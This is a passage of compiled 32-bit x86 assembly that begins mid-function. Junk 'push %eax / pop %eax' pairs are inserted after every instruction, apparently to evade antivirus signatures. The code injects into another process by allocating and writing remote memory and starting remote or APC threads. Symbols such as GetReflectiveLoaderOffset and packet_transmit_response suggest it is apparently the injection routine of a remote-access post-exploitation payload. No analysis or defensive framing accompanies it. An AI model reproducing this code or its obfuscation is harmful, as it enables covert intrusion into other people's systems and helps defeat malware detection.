	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC42, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L65
push %eax
pop %eax
L68:
	movl	$64, 16(%esp)
push %eax
pop %eax
	movl	$12288, 12(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualAllocEx@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	cmpl	$0, -28(%ebp)
push %eax
pop %eax
	jne	L70
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC43, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L65
push %eax
pop %eax
L70:
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__WriteProcessMemory@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L71
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC44, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L65
push %eax
pop %eax
L71:
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 20(%esp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 16(%esp)
push %eax
pop %eax
	movl	$1, 12(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	call	_inject_via_remotethread
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L72
push %eax
pop %eax
	movl	$LC45, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 24(%esp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 20(%esp)
push %eax
pop %eax
	movl	$1, 16(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	call	_inject_via_apcthread
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L72
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC46, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L65
push %eax
pop %eax
L72:
	movl	$0, -12(%ebp)
push %eax
pop %eax
L65:
	cmpl	$0, -20(%ebp)
push %eax
pop %eax
	je	L73
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
L73:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_strlen;	.scl	2;	.type	32;	.endef
	.def	_vsnprintf_s;	.scl	2;	.type	32;	.endef
	.def	_list_create;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_memset;	.scl	2;	.type	32;	.endef
	.def	_free;	.scl	2;	.type	32;	.endef
	.def	_CreateToolhelp32Snapshot@8;	.scl	2;	.type	32;	.endef
	.def	_Thread32First@8;	.scl	2;	.type	32;	.endef
	.def	_list_push;	.scl	2;	.type	32;	.endef
	.def	_Thread32Next@8;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_uint;	.scl	2;	.type	32;	.endef
	.def	_packet_transmit_response;	.scl	2;	.type	32;	.endef
	.def	_list_pop;	.scl	2;	.type	32;	.endef
	.def	_list_destroy;	.scl	2;	.type	32;	.endef
	.def	_create_remote_thread;	.scl	2;	.type	32;	.endef
	.def	_GetReflectiveLoaderOffset;	.scl	2;	.type	32;	.endef
